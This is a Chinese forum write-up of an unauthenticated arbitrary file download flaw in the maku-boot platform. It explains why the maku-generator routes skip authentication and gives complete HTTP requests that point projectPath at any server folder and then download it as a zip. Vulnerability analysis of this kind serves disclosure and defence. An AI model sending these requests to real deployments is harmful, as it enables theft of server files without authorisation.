---
title: maku-boot未授权任意文件下载漏洞分析
url: https://forum.butian.net/share/4490
source: 奇安信攻防社区
date: 2025-08-13
fetch_date: 2025-10-07T00:12:40.975629
---

# maku-boot未授权任意文件下载漏洞分析

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### maku-boot未授权任意文件下载漏洞分析

通过分析系统路由找到未授权路径，针对目标路径找到文件下载漏洞并展开攻击。

一、项目信息
======
maku-boot 是采用SpringBoot3.4、SpringSecurity6.4、Mybatis-Plus、Vue3、Element-plus等技术开发的低代码开发平台，旨在为开发者提供一个简洁、高效、可扩展的低代码开发平台。
gitee: <https://gitee.com/makunet/maku-boot>
开发文档：[https://maku.net/docs/maku-boot](https://gitee.com/link?target=https%3A%2F%2Fmaku.net%2Fdocs%2Fmaku-boot)
二、环境搭建
======
修改配置文件信息
maku-server/src/main/resources/application-dev.yml
![image-20240619224107782](https://115.190.149.135/img/get2//20250725151403254.png)
导入数据库
![image-20240619224219056](https://115.190.149.135/img/get2//20250725151409872.png)
![image-20240619224343842](https://115.190.149.135/img/get2//20250725151415240.png)
项目打包，运行即可
![image-20240619224441063](https://115.190.149.135/img/get2//20250725151422070.png)
三、漏洞分析
======
1、未授权分析
-------
系统默认忽略对maku-generator地址的权限校验,maku-generator其实是maku官方自行开发的一个组件，该组件自身也不带鉴权功能。
参考： <https://gitee.com/makunet/maku-generator>
net/maku/framework/security/config/SecurityFilterConfig.java:37
![image-20240619224636297](https://115.190.149.135/img/get2//20250725151425896.png)
![image-20240619224952799](https://115.190.149.135/img/get2//20250725151650359.png)
![image-20240619225020896](https://115.190.149.135/img/get2//20250725151430608.png)
2、文件下载分析
--------
文件下载时根据id号获取文件夹路径并下载，注意：是文件夹，最终得到的是整个文件夹的zip压缩包。
net/maku/generator/controller/ProjectModifyController.java:72
![image-20240619225257142](https://115.190.149.135/img/get2//20250725151433973.png)
![image-20240619225430495](https://115.190.149.135/img/get2//20250725151439700.png)
这里的exclusions在保存时直接留空可以避免很多麻烦，后面就是正常的文件读取逻辑。
![image-20240619230740480](https://115.190.149.135/img/get2//20250725151449198.png)
3、项目更新接口
--------
使用PUT方式时会进入更新接口
![image-20240619231053622](https://115.190.149.135/img/get2//20250725151455074.png)
其参数包含项目路径
![image-20240619231140672](https://115.190.149.135/img/get2//20250725151459579.png)
4、漏洞验证
------
更新项目信息，projectPath为要读取的文件夹
![image-20240619231236419](https://115.190.149.135/img/get2//20250725151506646.png)
完整请求
```text
PUT /maku-generator/gen/project HTTP/1.1
Host: 192.168.64.130:8089
Content-Length: 302
Accept: application/json, text/plain, \\*/\\*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://test.com:8089
Referer: http://test.com:8089/maku-generator/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
​
{"id":1,"projectName":"maku-boot","projectCode":"maku","projectPackage":"net.maku","projectPath":"/root/web/logs","modifyProjectName":"baba-boot","modifyProjectCode":"baba","modifyProjectPackage":"com.baba","exclusions":"","modifySuffix":"java,xml,yml,txt","createTime":"2024-06-18T23:26:33.000+08:00"}
```
调用下载接口，可以读取到目标文件
![image-20240619231448581](https://115.190.149.135/img/get2//20250725151525961.png)
完整请求
```text
GET /maku-generator/gen/project/download/1 HTTP/1.1
Host: 192.168.64.130:8089
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\\*/\\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://test.com:8089/maku-generator/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```
也可以浏览器直接访问目标地址获取压缩包
<http://192.168.64.130:8089/maku-generator/gen/project/download/1>
![image-20240619231709369](https://115.190.149.135/img/get2//20250725151612143.png)
![image-20240619231728031](https://115.190.149.135/img/get2//20250725151617819.png)

* 发表于 2025-08-12 09:42:41
* 阅读 ( 2663 )
* 分类：[漏洞分析](https://forum.butian.net/community/Vul_analysis)

0 推荐
 收藏

## 0 条评论

请先 [登录](https://forum.butian.net/login) 后评论

[![fibuleX](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/be8b4f29a3b71b6172b6384087484e8e8ccc5a8.jpg)](https://forum.butian.net/people/26430)

[fibuleX](https://forum.butian.net/people/26430)

3 篇文章

[奇安信攻防社区](https://forum.butian.net)|
联系我们

|
[sitemap](https://forum.butian.net/sitemap)

Copyright © 2013-2023 BUTIAN.NET 版权所有 [京ICP备18014330号-2](https://beian.miit.gov.cn/#/Integrated/index)

×

#### 发送私信

请先 [登录](https://forum.butian.net/login) 后发送私信

×

#### 举报此文章

垃圾广告信息：
广告、推广、测试等内容

违规内容：
色情、暴力、血腥、敏感信息等内容

不友善内容：
人身攻击、挑衅辱骂、恶意行为

其他原因：
请补充说明

举报原因:

取消
举报

×

#### ![fibuleX](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/be8b4f29a3b71b6172b6384087484e8e8ccc5a8.jpg)

如果觉得我的文章对您有用，请随意打赏。你的支持将鼓励我继续创作！

![]()

---